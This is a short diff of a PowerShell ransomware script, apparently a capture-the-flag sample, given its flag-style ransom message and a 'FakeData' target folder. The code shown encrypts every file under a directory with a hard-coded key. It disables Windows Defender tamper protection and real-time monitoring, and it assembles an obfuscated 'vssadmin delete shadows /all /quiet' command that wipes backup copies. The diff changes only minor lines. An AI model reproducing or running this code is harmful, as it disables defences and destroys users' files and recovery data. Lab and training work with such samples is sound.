@@ -113,7 +113,6 @@ function main{
     $Target = [System.IO.Directory]::EnumerateFiles($TargetDirectory,"*",[System.IO.SearchOption]::AllDirectories)
     foreach($file in $Target){
         Encrypt-File -FilePath $File -EncryptionKey $EncKey
-        #Rename-Item -Path $file -NewName $file+".vlad" -Force
         #Decrypt-File -FilePath $file -EncryptionKey $EncKey
     }
     try {
@@ -134,7 +133,7 @@ $path = "$env:USERPROFILE\Desktop\FakeData"
 Set-MPPreference -DisableTamperProtection $true
 Set-MpPreference -DisableRealtimeMonitoring $true
 main -TargetDirectory $path -EncKey 123 
-Write-Host "All your files are belong to us DSR{Y0U_G07_R4NS0WM4R3}"
+powershell.exe Write-Host "All your files are belong to us DSR{Y0U_G07_R4NS0WM4R3}"
 $AS = "vssadmi"
 $AZ = "n.exe delete shadows /all /quiet"
 $AD = $AS + $AZ
